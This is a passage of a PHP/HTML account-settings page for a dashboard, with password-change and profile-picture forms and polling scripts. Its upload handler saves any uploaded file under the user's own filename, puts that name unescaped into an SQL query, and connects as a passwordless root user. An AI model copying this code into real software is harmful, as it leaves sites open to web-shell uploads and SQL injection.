                                                <option value="Mauritius">Mauritius</option>
                                                <option value="Mayotte">Mayotte</option>
                                                <option value="Mexico">Mexico</option>
                                                <option value="Micronesia, Federated States of">Micronesia, Federated
                                                    States of</option>
                                                <option value="Moldova, Republic of">Moldova, Republic of</option>
                                                <option value="Monaco">Monaco</option>
                                                <option value="Mongolia">Mongolia</option>
                                                <option value="Montenegro">Montenegro</option>
                                                <option value="Montserrat">Montserrat</option>
                                                <option value="Morocco">Morocco</option>
                                                <option value="Mozambique">Mozambique</option>
                                                <option value="Myanmar">Myanmar</option>
                                                <option value="Namibia">Namibia</option>
                                                <option value="Nauru">Nauru</option>
                                                <option value="Nepal">Nepal</option>
                                                <option value="Netherlands">Netherlands</option>
                                                <option value="Netherlands Antilles">Netherlands Antilles</option>
                                                <option value="New Caledonia">New Caledonia</option>
                                                <option value="New Zealand">New Zealand</option>
                                                <option value="Nicaragua">Nicaragua</option>
                                                <option value="Niger">Niger</option>
                                                <option value="Nigeria">Nigeria</option>
                                                <option value="Niue">Niue</option>
                                                <option value="Norfolk Island">Norfolk Island</option>
                                                <option value="Northern Mariana Islands">Northern Mariana Islands
                                                </option>
                                                <option value="Norway">Norway</option>
                                                <option value="Oman">Oman</option>
                                                <option value="Pakistan">Pakistan</option>
                                                <option value="Palau">Palau</option>
                                                <option value="Palestinian Territory, Occupied">Palestinian Territory,
                                                    Occupied</option>
                                                <option value="Panama">Panama</option>
                                                <option value="Papua New Guinea">Papua New Guinea</option>
                                                <option value="Paraguay">Paraguay</option>
                                                <option value="Peru">Peru</option>
                                                <option value="Philippines">Philippines</option>
                                                <option value="Pitcairn">Pitcairn</option>
                                                <option value="Poland">Poland</option>
                                                <option value="Portugal">Portugal</option>
                                                <option value="Puerto Rico">Puerto Rico</option>
                                                <option value="Qatar">Qatar</option>
                                                <option value="Reunion">Reunion</option>
                                                <option value="Romania">Romania</option>
                                                <option value="Russian Federation">Russian Federation</option>
                                                <option value="Rwanda">Rwanda</option>
                                                <option value="Saint Helena">Saint Helena</option>
                                                <option value="Saint Kitts and Nevis">Saint Kitts and Nevis</option>
                                                <option value="Saint Lucia">Saint Lucia</option>
                                                <option value="Saint Pierre and Miquelon">Saint Pierre and Miquelon
                                                </option>
                                                <option value="Saint Vincent and The Grenadines">Saint Vincent and The
                                                    Grenadines</option>
                                                <option value="Samoa">Samoa</option>
                                                <option value="San Marino">San Marino</option>
                                                <option value="Sao Tome and Principe">Sao Tome and Principe</option>
                                                <option value="Saudi Arabia">Saudi Arabia</option>
                                                <option value="Senegal">Senegal</option>
                                                <option value="Serbia">Serbia</option>
                                                <option value="Seychelles">Seychelles</option>
                                                <option value="Sierra Leone">Sierra Leone</option>
                                                <option value="Singapore">Singapore</option>
                                                <option value="Slovakia">Slovakia</option>
                                                <option value="Slovenia">Slovenia</option>
                                                <option value="Solomon Islands">Solomon Islands</option>
                                                <option value="Somalia">Somalia</option>
                                                <option value="South Africa">South Africa</option>
                                                <option value="South Georgia and The South Sandwich Islands">South
                                                    Georgia and The South Sandwich Islands</option>
                                                <option value="Spain">Spain</option>
                                                <option value="Sri Lanka">Sri Lanka</option>
                                                <option value="Sudan">Sudan</option>
                                                <option value="Suriname">Suriname</option>
                                                <option value="Svalbard and Jan Mayen">Svalbard and Jan Mayen</option>
                                                <option value="Swaziland">Swaziland</option>
                                                <option value="Sweden">Sweden</option>
                                                <option value="Switzerland">Switzerland</option>
                                                <option value="Syrian Arab Republic">Syrian Arab Republic</option>
                                                <option value="Taiwan">Taiwan</option>
                                                <option value="Tajikistan">Tajikistan</option>
                                                <option value="Tanzania, United Republic of">Tanzania, United Republic
                                                    of</option>
                                                <option value="Thailand">Thailand</option>
                                                <option value="Timor-leste">Timor-leste</option>
                                                <option value="Togo">Togo</option>
                                                <option value="Tokelau">Tokelau</option>
                                                <option value="Tonga">Tonga</option>
                                                <option value="Trinidad and Tobago">Trinidad and Tobago</option>
                                                <option value="Tunisia">Tunisia</option>
                                                <option value="Turkey">Turkey</option>
                                                <option value="Turkmenistan">Turkmenistan</option>
                                                <option value="Turks and Caicos Islands">Turks and Caicos Islands
                                                </option>
                                                <option value="Tuvalu">Tuvalu</option>
                                                <option value="Uganda">Uganda</option>
                                                <option value="Ukraine">Ukraine</option>
                                                <option value="United Arab Emirates">United Arab Emirates</option>
                                                <option value="United Kingdom">United Kingdom</option>
                                                <option value="United States">United States</option>
                                                <option value="United States Minor Outlying Islands">United States Minor
                                                    Outlying Islands</option>
                                                <option value="Uruguay">Uruguay</option>
                                                <option value="Uzbekistan">Uzbekistan</option>
                                                <option value="Vanuatu">Vanuatu</option>
                                                <option value="Venezuela">Venezuela</option>
                                                <option value="Viet Nam">Viet Nam</option>
                                                <option value="Virgin Islands, British">Virgin Islands, British</option>
                                                <option value="Virgin Islands, U.S.">Virgin Islands, U.S.</option>
                                                <option value="Wallis and Futuna">Wallis and Futuna</option>
                                                <option value="Western Sahara">Western Sahara</option>
                                                <option value="Yemen">Yemen</option>
                                                <option value="Zambia">Zambia</option>
                                                <option value="Zimbabwe">Zimbabwe</option>                                        </select>
                                    </div>
                                </div>
                                <div class="col-md-6">
                                    <div class="form-group">
                                        <label class="form-label" for="phone-no">Gender</label>
                                       
                                    </div>
                                </div>
                                <div class="col-md-12">
                                   
                                </div>
                                <div class="col-12">
                                    <ul class="align-center flex-wrap flex-sm-nowrap gx-4 gy-2">
                                       
                                        <li>
                                            <a href="index.php" data-bs-dismiss="modal" class="link link-light">Cancel</a>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                        </form>
                    </div><!-- .tab-pane -->
                    <div class="tab-pane" id="security">
                        <div class="row gy-4">
                            <form action="#" method="post">
                            <input type="hidden" name="csrf_token" value="f72279d4f8340005ec37cf3eb2309ef8">
                                <div class="col-md-6">
                                    <div class="form-group">
                                        <label class="form-label" for="old password">Old Password</label>
                                        <input type="password" class="form-control form-control-lg" name="oldpassword">
                                    </div>
                                </div>
                                <div class="col-md-6">
                                    <div class="form-group">
                                        <label class="form-label" for="new password">New Password</label>
                                        <input type="password" class="form-control form-control-lg" name="npassword">
                                    </div>
                                </div>
                                <div class="col-md-6 mb-2">
                                    <div class="form-group">
                                        <label class="form-label" for="confirm password">Confirm Password</label>
                                        <input type="password" class="form-control form-control-lg" name="cpassword">
                                    </div>
                                </div>
                                <div class="col-12">
                                    <ul class="align-center flex-wrap flex-sm-nowrap gx-4 gy-2">
                                        <li>
                                            <button type="submit" name="update_password"
                                                class="btn btn-lg btn-primary">Update Password</button>
                                        </li>
                                        <li>
                                            <a href="#" data-bs-dismiss="modal" class="link link-light">Cancel</a>
                                        </li>
                                    </ul>
                                </div>
                            </form>
                        </div>
                    </div><!-- .tab-pane -->
                    <div class="tab-pane" id="picture">
                        <div class="row gy-4">
                            <div class="col-md-6">
                                   <img src="../images/avatar/AvatarMaker.html" alt="" width="150px">
                                                                        </div>
																		<!----------------profile upload------------------------->
																		
<?php
error_reporting(0);

$msg = "";

// If upload button is clicked ...
if (isset($_POST['upload'])) {

    $filename = $_FILES["uploadfile"]["name"];
    $tempname = $_FILES["uploadfile"]["tmp_name"];
    $folder = "./img/" . $filename;

    $db = mysqli_connect("localhost", "root", "", "global");

    // Get all the submitted data from the form
   //$sql = "INSERT INTO globaltable (image) VALUES ('$filename') WHERE id ='2'";
   $sql = "UPDATE `globaltable` SET `image` = '$filename' WHERE `globaltable`.`id` = $id";
    // Execute query
   mysqli_query($db, $sql);

    // Now let's move the uploaded image into the folder: image
    if (move_uploaded_file($tempname, $folder)) {
        echo "<h3>&nbsp; Image uploaded successfully!</h3>";
		
    } else {
        echo "<h3>&nbsp; Failed to upload image!</h3>";
    }
}
?>
																		
																		<!-------------------prfile upload pics end--------------------->
																		
																		
                            <form action="" method="post" enctype="multipart/form-data">
                           <!--- <input type="hidden" name="csrf_token" value="f72279d4f8340005ec37cf3eb2309ef8">--->
                                <div class="col-md-6 mb-2">
                                    <div class="form-group">
                                        <label class="form-label" for="picture">Choose File</label>
                                        <input type="file" class="form-control form-control-lg" name="uploadfile">
                                    </div>
                                </div>
                                <div class="col-12">
                                    <ul class="align-center flex-wrap flex-sm-nowrap gx-4 gy-2">
                                        <li>
                                            <button type="submit" name="upload"
                                                class="btn btn-lg btn-primary">Update Picture</button>
                                        </li>
                                        <li>
                                            <a href="#" data-bs-dismiss="modal" class="link link-light">Cancel</a>
                                        </li>
                                    </ul>
                                </div>
                            </form>
                        </div>
                    </div><!-- .tab-pane -->
                </div>
				
				
				
				
				
<!-- .tab-content -->
            </div><!-- .modal-body -->
        </div><!-- .modal-content -->
    </div><!-- .modal-dialog -->
</div><!-- .modal -->
<div class="nk-footer">
                    <div class="container-fluid">
                        <div class="nk-footer-wrap">
                            <div class="nk-footer-copyright">
                                Copyright &copy; 2012 - <?php echo date('Y');?>. All right Reserved.                            </div>
                           
                        </div>
                    </div>
                </div>
                <!-- footer @e -->
            </div>
            <!-- wrap @e -->
        </div>
        <!-- main @e -->
    </div>
    <!-- app-root @e -->
    <!-- select region modal -->
    
	
	
	
    <div id="earning_topup"></div>
    <div id="referral_topup"></div>
    <!-- .modal -->
    <!-- JavaScript -->
    <script src="assets/js/bundle583f.js?ver=3.1.3"></script>
    <script src="assets/js/scripts583f.js?ver=3.1.3"></script>
    <script src="assets/js/charts/chart-crypto583f.js?ver=3.1.3"></script>
    <script src="assets/js/libs/datatable-btns583f.js?ver=3.1.3"></script>
    <script src="js/balance.js"></script>

    <script src="js/plan.js"></script>
    <script>
        setInterval(function(){ 
            $("#earning_topup").load("topup.html");
        }, 
        2000);
        setInterval(function(){ 
            $("#referral_topup").load("referral_topup.html");
        }, 
        3000);
    </script>
    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
<script>
    function sent(){
   Swal.fire({
  title: "verification pending!",
  text: "valid id has been sent verification might take within 24hrs",
  icon: "success"
});

}
    </script>
    <script>
        function copy() {
            // Get the text field
            var copyText = document.getElementById("refUrl");

            // Select the text field
            copyText.select();
            copyText.setSelectionRange(0, 99999); // For mobile devices

            // Copy the text inside the text field
            navigator.clipboard.writeText(copyText.value);

            // Alert the copied text
            alert("Copied the text: " + copyText.value);
        }
    </script>
    <script>
        $(document).ready(function() {
            $(document).on('click', '.logout', function() {
                Swal.fire({
                    title: 'Are you sure you want to logout?',
                    text: "signing out from account!",
                    icon: 'warning',
                    showCancelButton: true,
                    confirmButtonColor: '#3085d6',
                    cancelButtonColor: '#d33',
                    confirmButtonText: 'Yes, logout!'
                }).then((result) => {
                    if (result.isConfirmed) {
                        window.location.href = "logout.php";
                    }
                });
            });
        });
    </script>
	
		<script>
//let cnt =document.getElementById('cnty');	
//let d=document.getElementById('ssnx');
//if(cnt == 'road'){
//d.style.display='block';
//}else{
//d.style.display='none';
//}

	
	</script>
</body>
</html>